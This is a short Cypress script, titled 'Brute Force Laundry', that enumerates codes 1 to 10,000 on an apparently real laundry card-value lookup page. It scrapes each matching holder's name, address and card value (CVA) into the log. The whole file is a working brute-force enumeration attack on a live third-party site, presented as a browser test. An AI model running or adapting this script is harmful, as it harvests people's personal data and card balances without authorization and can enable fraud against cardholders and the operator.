/// <reference types="Cypress" />

describe('Brute Force Laundry', () => {
  it('go forever', () => {
    const iterations = Array.from({ length: 10000 }, (_e, i) => i + 1)

    cy.wrap(iterations).each((i) => {
      cy.log(`Testing CVA ${i}`)

      cy.visit('https://www.sdirevalue.com/JustPurchaseCode.aspx')
      
      cy.get('#ContentSection_inputSearchCVA')
        .type(`${i}{enter}`)

      cy.document().then((doc) => {
        let address = doc.querySelector('.card > .card-header > .text-muted')

        if (!address) {
          cy.log(`[Not Found] No CVA Data Found for ${i}`)
          return
        }

        address = address.textContent

        const name = doc.querySelector('.card > .card-body > div > h4 > span').textContent
        const stateAddressZip = doc.querySelector('.card > .card-body > div > small > span').textContent
        const cva = doc.querySelector('.card > .card-body > div > h3 > span').textContent
  
        cy.log(`[Found] Address: ${address}, ${stateAddressZip}, Name: ${name}, CVA: ${cva}`)
      })
    })
  })
})
